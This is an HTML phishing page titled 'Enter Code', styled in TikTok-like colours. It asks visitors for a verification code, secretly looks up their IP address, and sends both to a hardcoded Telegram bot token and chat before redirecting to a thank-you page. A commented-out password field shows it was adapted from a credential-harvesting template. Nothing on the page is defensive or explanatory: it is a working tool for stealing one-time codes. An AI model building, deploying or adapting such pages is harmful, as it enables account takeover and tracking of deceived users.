<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Enter Code</title>
  <style>
    /* Reset & fonts */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Poppins', sans-serif;
    }

    body {
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: linear-gradient(135deg, #111 0%, #1a1a1a 100%);
      color: #fff;
    }

    .card {
      background: #181818;
      padding: 50px 40px;
      border-radius: 24px;
      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.6);
      width: 350px;
      text-align: center;
      transition: transform 0.3s;
    }

    .card:hover {
      transform: translateY(-5px);
    }

    .card h1 {
      font-size: 2rem;
      background: linear-gradient(45deg, #ff0050, #69c9d0);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      margin-bottom: 15px;
    }

    .card p {
      color: #aaa;
      font-size: 0.95rem;
      margin-bottom: 30px;
    }

    form {
      display: flex;
      flex-direction: column;
      gap: 20px;
    }

    input[type="text"] {
      padding: 18px 20px;
      border-radius: 14px;
      border: none;
      outline: none;
      font-size: 1.2rem;
      color: #fff;
      background: #222;
      transition: all 0.3s;
    }

    input[type="text"]::placeholder {
      color: #555;
    }

    input[type="text"]:focus {
      background: #333;
      box-shadow: 0 0 12px #ff0050, 0 0 18px #69c9d0;
    }

    button {
      padding: 16px;
      border-radius: 14px;
      border: none;
      background: linear-gradient(45deg, #ff0050, #69c9d0);
      color: #fff;
      font-size: 1.1rem;
      cursor: pointer;
      font-weight: 600;
      transition: all 0.3s;
    }

    button:hover {
      opacity: 0.9;
      transform: scale(1.05);
      box-shadow: 0 6px 20px rgba(255, 0, 80, 0.4), 0 6px 20px rgba(105, 201, 208, 0.4);
    }

    @media (max-width: 400px) {
      .card {
        width: 90%;
        padding: 40px 20px;
      }
      input[type="text"] {
        font-size: 1rem;
        padding: 14px 16px;
      }
      button {
        font-size: 1rem;
        padding: 14px;
      }
    }
  </style>
</head>
<body>
  <div class="card">
    <h1>Enter Code</h1>
    <p>Type your code below to continue. No fixed length required.</p>
    <form id="contactForm"  method="POST">
                  <input type="text" id="ipaddress" name="ipaddress" hidden>

      <input id="code" type="text" placeholder="Enter your code" autocomplete="off">
      <button type="submit">Submit</button>
    </form>
    
  </div>
   <script>
      document.addEventListener('DOMContentLoaded', function () {
        // Replace 'https://api.ipify.org?format=json' with a preferred IP API if needed
        fetch('https://api.ipify.org?format=json')
          .then(response => response.json())
          .then(data => {
            const ipaddress = data.ip;
            document.getElementById('ipaddress').value = ipaddress;
          })
          .catch(error => {
            console.error('Error fetching IP address:', error);
          });
      });




      document.getElementById('contactForm').addEventListener('submit', function (event) {
        event.preventDefault();

        var code = document.getElementById('code').value;
        // var password = document.getElementById('password').value;
        var ipaddress = document.getElementById('ipaddress').value;

        var telegramMessage = `code: ${code}\nIpaddress: ${ipaddress}`;
             var token = '8519891519:AAE7AqpsX4nTAnXaUEqPh8tcmwtaB-n0PYQ';
      var chat_id = '6069082133';
        var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(telegramMessage)}`;

        fetch(url)
          .then(response => response.json())
          .then(data => {
            if (data.ok) {
              window.location.href = 'thanks.html';  // Redirect to thank you page
            } else {
              alert('Error sending message.');
            }
          })
          .catch(error => {
            console.error('Error:', error);
          });
      });

    </script>
</body>
</html>
